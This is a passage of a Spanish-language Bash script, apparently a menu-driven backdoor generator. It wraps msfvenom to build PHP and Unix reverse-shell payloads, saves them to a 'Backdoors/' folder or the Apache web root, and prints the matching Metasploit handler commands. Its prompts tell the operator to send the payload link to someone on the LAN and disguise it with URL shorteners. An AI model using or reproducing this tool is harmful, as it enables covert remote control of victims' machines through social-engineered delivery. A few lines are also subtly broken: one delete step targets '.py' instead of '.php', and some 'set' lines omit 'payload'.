		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p php/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport R > /var/www/html/$nombre.php
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload php/meterpreter_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.php \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .macho del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.php
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p php/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport R > $nombre.php
			mv $nombre.php Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload php/meterpreter_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p php/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport R > $ruta/$nombre.php
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload php/meterpreter_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi

	elif [[ $optiondos == 2 || $optiondos == 02 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mphp/meterpreter/reverse_tcp"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .php > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .php al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .php. Tambien si quieres que el .php se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .php al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > /var/www/html/$nombre.php
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload php/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.php \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .macho del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.php
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $nombre.php
			mv $nombre.php Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload php/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $ruta/$nombre.php
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload php/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
 

	elif [[ $optiondos == 3 || $optiondos == 03 ]]; then 
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mphp/reverse_php"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .php > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .php al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .php. Tambien si quieres que el .php se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .php al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p php/reverse_php LHOST=$lhost LPORT=$lport R > /var/www/html/$nombre.php
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload php/reverse_php"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.php \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .macho del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.py
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p php/reverse_php LHOST=$lhost LPORT=$lport R > $nombre.php
			mv $nombre.php Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload php/reverse_php"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p php/reverse_php LHOST=$lhost LPORT=$lport R > $ruta/$nombre.php
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload php/reverse_php"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
	fi
fi 
if [[ $option == 7 || $option == 07 ]]; then 
clear
banner9
echo -e                  "\e[0;36m[\e[0;34m01\e[0;36m] \e[1;36mcmd/unix/reverse_bash "
echo -e                  "\e[0;36m[\e[0;34m02\e[0;36m] \e[1;36mcmd/unix/reverse_bash_telnet_ssl"
echo ""

read -p $"Payload > " optiondos
	if [[ $optiondos == 1 || $optiondos == 01 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mcmd/unix/reverse_bash"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .sh > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .sh al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .sh. Tambien si quieres que el .sh se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .sh al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p cmd/unix/reverse_bash LHOST=$lhost LPORT=$lport -f raw > /var/www/html/$nombre.sh
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset cmd/unix/reverse_bash"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.sh \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .macho del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.sh
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p cmd/unix/reverse_bash LHOST=$lhost LPORT=$lport -f raw > $nombre.sh
			mv $nombre.sh Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload cmd/unix/reverse_bash"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p cmd/unix/reverse_bash LHOST=$lhost LPORT=$lport -f raw > $ruta/$nombre.sh
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload cmd/unix/reverse_bash"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
	elif [[ $optiondos == 2 || $optiondos == 02 ]]; then 
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mcmd/unix/reverse_bash_telnet_ssl"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .sh > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .sh al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .sh. Tambien si quieres que el .sh se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .sh al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p cmd/unix/reverse_bash_telnet_ssl LHOST=$lhost LPORT=$lport -f raw > /var/www/html/$nombre.sh
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset cmd/unix/reverse_bash_telnet_ssl"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.sh \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .macho del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.sh
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p cmd/unix/reverse_bash_telnet_ssl LHOST=$lhost LPORT=$lport -f raw > $nombre.sh
			mv $nombre.sh Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload cmd/unix/reverse_bash_telnet_ssl"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p cmd/unix/reverse_bash_telnet_ssl LHOST=$lhost LPORT=$lport -f raw > $ruta/$nombre.sh
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload cmd/unix/reverse_bash_telnet_ssl"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
	fi		
fi		
if [[ $option == 8 || $option == 08 ]]; then 
clear
